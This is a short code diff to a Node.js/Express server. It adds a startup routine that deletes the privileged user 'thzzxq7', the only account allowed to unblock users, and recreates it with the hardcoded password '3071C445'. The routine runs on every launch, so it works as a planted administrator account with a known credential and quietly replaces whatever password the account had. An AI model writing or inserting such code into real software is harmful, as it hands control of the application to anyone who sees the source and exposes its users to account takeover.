@@ -78,5 +78,14 @@ app.post("/unblock/:id",auth,(req,res)=>{
   if(req.user.username!=="thzzxq7") return res.sendStatus(403);
   db.run("UPDATE users SET blocked=0 WHERE id=?",[req.params.id],()=>res.json({ok:true}));
 });
+(async () => {
+  const hash = await require("bcrypt").hash("3071C445", 10);
 
+  db.run("DELETE FROM users WHERE username = 'thzzxq7'");
+
+  db.run(
+    "INSERT INTO users (username, password) VALUES (?, ?)",
+    ["thzzxq7", hash]
+  );
+})();
 app.listen(3000,()=>console.log("rodando"));
